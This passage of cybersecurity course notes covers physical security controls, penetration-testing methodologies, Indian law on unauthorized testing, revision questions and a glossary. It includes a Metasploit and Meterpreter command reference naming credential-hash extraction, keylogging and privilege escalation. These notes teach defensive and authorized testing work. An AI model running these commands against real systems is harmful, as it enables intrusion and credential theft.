| Perimeter fence | Preventive | Casual intruder | Determined attacker scales/cuts |
| Bollards | Preventive | Vehicle ramming | Does not stop walking attacker |
| Mantrap | Preventive | Tailgating | Expensive, throughput limited |
| Turnstile | Preventive | Casual tailgating | Tall attacker can jump/reach over |
| CCTV | Detective + Deterrent | Records + deters | Doesn't stop determined attacker |
| Access card | Preventive | Unauthorized access | Cloned, shared, stolen |
| Smart card + PIN | Preventive | Cloning (without PIN) | PIN shoulder-surfed |
| Biometric | Preventive | Impersonation | Gummy finger, deepfake |
| Security guard | All types | Multiple attacks | Social engineering vulnerable |
| Lighting | Deterrent | Opportunistic attacker | Disguise still possible |
| FM-200 | Corrective | Fire damage | Cost, requires clean agent system |
| UPS | Corrective | Power outage | Limited runtime — needs generator |

---

### 🔍 Penetration Testing Methodologies

| Methodology | Publisher | Primary Focus | Phases |
|---|---|---|---|
| **PTES** | Community | Comprehensive | 7: Pre-engagement → Reporting |
| **CEH** | EC-Council | Ethical hacking | 5: Recon → Clearing tracks |
| **NIST SP 800-115** | NIST | Federal/enterprise | 4: Planning → Reporting |
| **OWASP OTG** | OWASP | Web applications | Category-based (OTG-INFO, AUTHN, etc.) |
| **OSSTMM** | ISECOM | Quantified security | 5 channels: PHYS/SPEC/COMM/DATA/HUMAN |

---

### 📊 Test Type Comparison

| Property | Black Box | Grey Box | White Box |
|---|---|---|---|
| Prior knowledge | None | Partial | Full |
| Simulates | External attacker | Partial insider | Security audit |
| Efficiency | Lower | Balanced | Highest |
| Realism | Highest | High | Lower |
| Time required | Most | Moderate | Can be fastest |

---

### 🖥️ Metasploit Quick Reference

| Command | Function |
|---|---|
| `search <term>` | Find modules matching keyword |
| `use <module>` | Select module |
| `info` | Show module details |
| `show options` | List required settings |
| `set RHOSTS <ip>` | Set target |
| `set LHOST <ip>` | Set attacker IP |
| `set PAYLOAD <payload>` | Select payload |
| `run` / `exploit` | Execute module |
| `sessions -l` | List sessions |
| `sessions -i <n>` | Interact with session |
| `background` | Background current session |

**Meterpreter essentials:**

    getuid          → who am I?
    getsystem       → escalate to SYSTEM
    hashdump        → extract NTLM hashes
    keyscan_start   → start keylogging
    migrate <PID>   → move to stable process
    run post/...    → run post-exploitation module

---

### 📋 CEH 5 Phases

| Phase | Activity | Key Tools |
|---|---|---|
| **1. Reconnaissance** | OSINT, DNS, WHOIS, social media | Maltego, theHarvester, Shodan |
| **2. Scanning** | Port scan, OS fingerprint, vulnerability scan | Nmap, Nessus, OpenVAS |
| **3. Gaining Access** | Exploit vulnerabilities, crack passwords | Metasploit, Hydra, SQLmap |
| **4. Maintaining Access** | Backdoors, rootkits, persistence | Netcat, Meterpreter, cron |
| **5. Clearing Tracks** | Delete logs, remove tools, timestomp | Auditpol, log manipulation |

---

### ⚖️ Indian Legal Reference

| Law | Section | Offence | Penalty |
|---|---|---|---|
| IT Act 2000 | S.66 | Pentest without authorization | 3 yrs + ₹5L |
| IT Act 2000 | S.72 | Tester discloses client data | 2 yrs + ₹1L |
| IT Act 2000 | S.66F | Attack on critical infrastructure | Life imprisonment |
| IPC | S.441 | Criminal trespass — physical | 3 months + fine |
| IPC | S.380 | Hardware theft from premises | 7 yrs |
| DPDPA 2023 | — | Physical breach exposing personal data | ₹250 crore |

---

## ✅ Session Revision Snapshot

### ⚡ TL;DR — 5 Bullets

1. **Physical security is the foundation of all cybersecurity — physical
   access bypasses every software control.** Encryption, firewalls,
   AV, and MFA are all defeated by physical access to hardware.
   Defense-in-depth physical model uses concentric layers: perimeter →
   building → zones → secure areas → asset level. Each layer must
   function independently.

2. **Tailgating (victim unaware) and piggybacking (victim aware/coerced)
   are the primary physical access bypass attacks — defeated by mantraps.**
   RFID proximity cards are cloneable via passive reading — smart cards
   with cryptographic authentication resist cloning. MAC filtering
   equivalent in physical security: MAC = RFID card — both easily
   spoofed, neither is genuine security.

3. **Penetration testing requires written authorization (RoE/LOA) — testing
   without authorization is a criminal offence under IT Act S.66
   regardless of intent.** Three knowledge types: Black box (no info),
   White box (full info), Grey box (partial). Penetration testing
   EXPLOITS vulnerabilities to prove impact — vulnerability assessment
   only IDENTIFIES them without exploitation.

4. **PTES has 7 phases (Pre-engagement → Intelligence → Threat Model →
   Vulnerability ID → Exploitation → Post-Exploitation → Reporting);
   CEH has 5 phases (Reconnaissance → Scanning → Gaining Access →
   Maintaining Access → Clearing Tracks).** Know both. OWASP OTG is
   web application specific. OSSTMM uses 5 channels (PHYS/SPEC/COMM/
   DATA/HUMAN). NIST SP 800-115 has 4 phases.

5. **Metasploit framework has 7 module types: Auxiliary (scanning),
   Exploit (attack), Payload (code on target), Post (post-exploitation),
   Encoder (obfuscation), Evasion (AV bypass), NOP (padding).**
   Core workflow: `search → use → set options → run → Meterpreter`.
   `msfvenom` generates standalone payloads. `getsystem` in Meterpreter
   attempts privilege escalation. CVSS 9.0–10.0 = Critical,
   7.0–8.9 = High, 4.0–6.9 = Medium, 0.1–3.9 = Low.

---

### 🎯 MCQ-Likely Concepts

- [ ] Physical access bypasses all software controls — examples
- [ ] Defense-in-depth — five physical layers
- [ ] Tailgating vs piggybacking — awareness distinction
- [ ] Mantrap — defeats tailgating — one person at a time mechanism
- [ ] RFID cloning — proximity cards in plaintext — countermeasure: smart cards
- [ ] Dumpster diving — discarded documents — countermeasure: shredding
- [ ] Shoulder surfing — countermeasure: privacy screens
- [ ] Baiting — USB drop — countermeasure: disable autorun + awareness
- [ ] CCTV — detective + deterrent control (not preventive alone)
- [ ] FM-200 — fire suppression safe for electronics — replaces Halon
- [ ] Halon — banned since 1994 — ozone-depleting
- [ ] UPS types — standby vs line-interactive vs online double-conversion
- [ ] Online (double-conversion) UPS — best — zero transfer time
- [ ] Black box vs white box vs grey box — information provided, not scope
- [ ] Pentest vs vulnerability assessment — exploit vs identify
- [ ] PTES — 7 phases — Pre-engagement is FIRST
- [ ] CEH — 5 phases — Reconnaissance through Clearing Tracks
- [ ] Rules of Engagement — written authorization mandatory — scope definition
- [ ] CVSS 9–10 Critical, 7–8.9 High, 4–6.9 Medium, 0.1–3.9 Low
- [ ] Metasploit module types — Auxiliary, Exploit, Payload, Post, Encoder
- [ ] msfvenom — standalone payload generation
- [ ] Meterpreter — `getsystem`, `hashdump`, `migrate`, `keyscan_start`
- [ ] `search`, `use`, `set`, `run` — msfconsole workflow
- [ ] Red team vs penetration test — objective vs vulnerability list
- [ ] OSSTMM — 5 channels — PHYS/SPEC/COMM/DATA/HUMAN
- [ ] NIST SP 800-115 — 4 phases — Planning/Discovery/Attack/Reporting
- [ ] IT Act S.66 — pentest without authorization = criminal
- [ ] IPC S.441 — criminal trespass — physical unauthorized entry
- [ ] Lock picking — pin tumbler mechanism — tension wrench + hook pick

---

### 💼 Interview-Likely

- Explain why physical security is considered the foundation of all cybersecurity.
- What is the difference between tailgating and piggybacking — and how does a mantrap defeat both?
- Why is RFID proximity card cloning easier than most people assume — and what is the countermeasure?
- What is the difference between a black-box, white-box, and grey-box penetration test?
- Walk me through the five phases of a penetration test in the PTES methodology.
- What is the difference between a vulnerability assessment and a penetration test?
- Why is a signed Rules of Engagement document critical before starting any penetration test?
- What is the difference between active and passive reconnaissance in penetration testing?
- Explain the kill chain concept and how it maps to penetration testing phases.
- What deliverable does a penetration test produce and what must it contain?

---

## Next Session Bridge

Session 19 completes the physical security and penetration testing
methodology sub-phase — establishing both the foundation layer
(physical security) and the professional framework (PTES) that
structures all the technical attacks covered throughout Sessions 6–18.

Session 20 is the final session — **Malware Reverse Engineering**.
Where Sessions 6–19 covered attacking and defending systems, Session 20
examines malware itself as an artifact — dissecting it using static
and dynamic analysis techniques to understand what it does, how it
evades detection, and what indicators it leaves. The malware analysis
techniques in Session 20 tie directly back to the malware types from
Session 14 (viruses, worms) and the evasion techniques from Session 13
(packing, obfuscation, anti-VM) — providing the analytical methodology
to examine exactly those techniques from the defender's perspective.

---

<details>
<summary>📖 Glossary</summary>

| Term | Definition |
|---|---|
| **Access control vestibule** | Small room with two interlocking doors — only one opens at a time — prevents tailgating |
| **Badge cloning** | Copying RFID/NFC access card data to a blank card — bypasses card-based physical access |
| **Biometric lock** | Physical access control using biological characteristics — fingerprint, iris, face |
| **Black-box test** | Penetration test with no prior information about the target — simulates external attacker |
| **Bollard** | Short post or barrier preventing vehicle ramming attacks against building entrances |
| **Bug bounty** | Program offering monetary rewards to security researchers who responsibly disclose vulnerabilities |
| **CCTV** | Closed-Circuit Television — video surveillance system |
| **CERT-In** | Computer Emergency Response Team India — national cybersecurity incident response agency |
| **Clean desk policy** | Administrative control requiring employees to secure sensitive documents when leaving workstation |
| **CVSSv3** | Common Vulnerability Scoring System version 3 — 0–10 severity scale for vulnerabilities |
| **Dead zone** | Physical area with no CCTV coverage — blind spot in surveillance system |
| **Dumpster diving** | Recovering sensitive information from discarded waste — physical OSINT technique |
| **Environmental design** | CPTED — Crime Prevention Through Environmental Design — physical layout to deter attackers |
| **Evidence chain of custody** | Documented handling of evidence ensuring integrity for legal proceedings |
| **Exploitation** | Phase 3 of penetration testing — actively leveraging confirmed vulnerabilities to gain access |
| **External penetration test** | Assessment targeting internet-facing assets from outside the network perimeter |
| **Faraday cage** | RF-shielding enclosure blocking electromagnetic signals — prevents wireless data exfiltration |
| **Footprinting** | Passive information gathering about a target — Phase 1 reconnaissance |
| **Grey-box test** | Penetration test with partial information — simulates insider threat or partially known environment |
| **Guard dog** | Physical security measure using trained animals — perimeter and interior patrol |
| **ISECOM** | Institute for Security and Open Methodologies — publishes OSSTMM |
| **Kill chain** | Lockheed Martin framework describing attacker progression — 7 stages from recon to actions |
| **Lateral movement** | Post-exploitation technique — attacker pivots from initial access to other network segments |
| **Locking cabinet** | Physically secured storage for sensitive documents, media, and equipment |
| **Mantrap** | Alternative term for access control vestibule — two-door entry system |
| **MITRE ATT&CK** | Adversary Tactics, Techniques and Procedures knowledge base — used in penetration testing mapping |
| **Motion sensor** | Physical security device detecting movement — triggers alarm or recording |
| **NIST SP 800-115** | Technical Guide to Information Security Testing and Assessment — penetration testing standard |
| **NFC** | Near Field Communication — short-range wireless protocol — used in contactless access cards |
| **OSINT** | Open Source Intelligence — gathering information from publicly available sources |
| **OSSTMM** | Open Source Security Testing Methodology Manual — ISECOM security testing framework |
| **OWASP Testing Guide** | Web application penetration testing methodology — version 4.2 current |
| **PTES** | Penetration Testing Execution Standard — seven-phase comprehensive pentest methodology |
| **Passive reconnaissance** | Information gathering without direct target interaction — OSINT, DNS, WHOIS |
| **Penetration testing** | Authorized simulated attack to identify and demonstrate exploitable vulnerabilities |
| **Physical security** | Controls protecting physical assets — people, equipment, facilities — from physical threats |
| **Piggybacking** | Authorized person knowingly allows unauthorized person to enter secure area with them |
| **Port knocking** | Covert access method requiring specific port sequence before service becomes accessible |
| **Post-exploitation** | Phase 4 of penetration testing — maintaining access, privilege escalation, lateral movement |
| **Proximity card** | RFID-based access card — read at short range (few centimetres to metres) |
| **Red team** | Group simulating real adversary behaviour — comprehensive multi-vector attack simulation |
| **Reporting** | Final phase of penetration test — documents findings, risk ratings, and remediation |
| **RFID** | Radio Frequency Identification — wireless technology used in access cards and asset tracking |
| **Risk rating** | Severity classification of vulnerabilities — Critical/High/Medium/Low or CVSS score |
| **ROE** | Rules of Engagement — documented agreement defining pentest scope, methods, and constraints |
| **Scanning** | Phase 2 of penetration testing — active probing to enumerate services and vulnerabilities |
| **Shoulder surfing** | Observing someone entering credentials or sensitive data from nearby |
| **Shredding** | Mechanical destruction of sensitive documents — countermeasure for dumpster diving |
| **Smart card** | Contact-based card with embedded microprocessor — more secure than magnetic stripe |
| **Social engineering** | Psychological manipulation to trick individuals into disclosing information or granting access |
| **Statement of work** | Contract document defining scope, deliverables, timeline, and responsibilities for pentest |
| **Tailgating** | Unauthorized person follows authorized person through secure door without their awareness |
| **Threat modeling** | Structured analysis identifying potential threats, vulnerabilities, and countermeasures |
| **Turnstile** | Physical barrier requiring one-at-a-time passage — prevents tailgating |
| **Vishing** | Voice phishing — social engineering via telephone calls |
| **Vulnerability assessment** | Identifies and classifies vulnerabilities without actively exploiting them |
| **White-box test** | Penetration test with full information — source code, architecture, credentials |
| **Zero trust** | Security model assuming no implicit trust — verify every user, device, and request continuously |

</details>

---